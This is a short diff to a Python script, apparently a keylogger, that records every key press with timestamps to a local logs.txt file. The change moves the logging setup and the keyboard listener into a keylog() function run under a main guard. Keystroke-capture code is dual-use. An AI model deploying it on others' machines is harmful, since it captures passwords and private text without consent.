@@ -7,11 +7,6 @@ import os
 import logging
 import string
 
-username = os.getlogin()
-logging_directory = "."
-logging.basicConfig(filename=f"{logging_directory}/logs.txt",
-                    level=logging.DEBUG, format="%(asctime)s: %(message)s")
-
 def key_handler(key):
     logging.info(key)
     parse(key)
@@ -23,5 +18,15 @@ def parse(key):
         return
     listen()
 
-with Listener(on_press=key_handler) as listener:
-    listener.join()
+
+def keylog():
+    username = os.getlogin()
+    logging_directory = "."
+    logging.basicConfig(filename=f"{logging_directory}/logs.txt",
+                        level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+    with Listener(on_press=key_handler) as listener:
+        listener.join()
+
+if __name__=="__main__":
+    keylog()
